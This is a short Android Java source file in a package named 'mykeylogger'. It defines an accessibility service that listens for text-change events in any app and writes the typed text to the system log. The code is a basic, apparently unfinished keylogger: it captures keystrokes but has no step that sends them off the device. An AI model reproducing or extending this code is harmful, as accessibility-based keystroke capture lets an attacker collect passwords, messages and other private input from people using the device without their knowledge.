package com.example.mykeylogger;

import android.accessibilityservice.AccessibilityService;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

public class MyServiceKL extends AccessibilityService {
    public MyServiceKL() {
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String changedText = getEventText(event);

            if (!TextUtils.isEmpty(changedText)) {
                // Do something with the changed text
                Log.i("TAG1", "Changed Text: " + changedText);
            }
        }
    }

    @Override
    public void onInterrupt() {

    }

    private String getEventText(AccessibilityEvent event) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);

        }
        return sb.toString();
    }

    /*@Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }*/
}